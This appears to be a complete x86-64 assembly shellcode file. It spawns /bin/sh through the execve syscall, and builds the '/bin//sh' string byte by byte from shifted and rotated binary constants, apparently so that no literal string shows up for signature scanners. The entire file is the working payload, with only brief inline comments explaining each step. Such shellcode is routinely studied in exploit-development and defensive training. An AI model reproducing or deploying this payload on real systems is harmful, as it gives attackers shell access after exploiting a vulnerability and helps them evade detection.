section .text
global _start

_start:
	;make zero rax register
	xor eax, eax

	; reserve 8 bytes from stack
	sub rsp, 8

	; construct '/'
	mov al, 0b10111100	; 188
	shr al, 2		    ; 47
	mov byte [rsp+0], al

	; construct 'b'
	mov al, 0b00110001 	; 49
	rol al, 1	    	; 98
	mov byte [rsp + 1], al

	; construct 'i'
	mov al, 0b11010010	; 210
	ror al, 1	    	; 105
	mov byte [rsp + 2], al

	; construct 'n'
	mov al, 0b00110111	; 55
	shl al, 1	    	; 110
	mov byte [rsp + 3], al

	; construct '/'
	mov al, 0b10111100  ; 188
    shr al, 2           ; 47
    mov byte [rsp + 4], al

	; construct '/'
	mov al, 0b10111100  ; 188
    shr al, 2           ; 47
    mov byte [rsp + 5], al

	;construct 's'
	mov al, 0b11100110	; 230	
	ror al, 1		    ; 115
	mov byte [rsp + 6], al

	;construct 'h'
	mov al, 0b00001101	; 13
	shl al, 3	    	; 104
	mov byte [rsp + 7], al

	; null terminator
	shr al, 16
	mov byte [rsp + 8], al

	push 59
	pop rax
	mov rdi, rsp
	xor esi, esi
	xor edx, edx
	syscall
